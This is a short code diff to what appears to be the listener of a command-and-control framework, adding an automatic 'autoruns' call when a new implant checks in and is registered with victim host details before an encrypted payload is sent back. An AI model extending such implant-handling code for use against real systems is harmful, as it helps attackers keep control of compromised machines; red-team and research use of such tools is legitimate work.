@@ -283,6 +283,7 @@ class MyHandler(BaseHTTPRequestHandler):
                 newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
                 newImplant.save()
                 newImplant.display()
+                newImplant.autoruns()
                 responseVal = encrypt(KEY, newImplant.SharpCore)
                 s.send_response(200)
                 s.send_header("Content-type", "text/html")
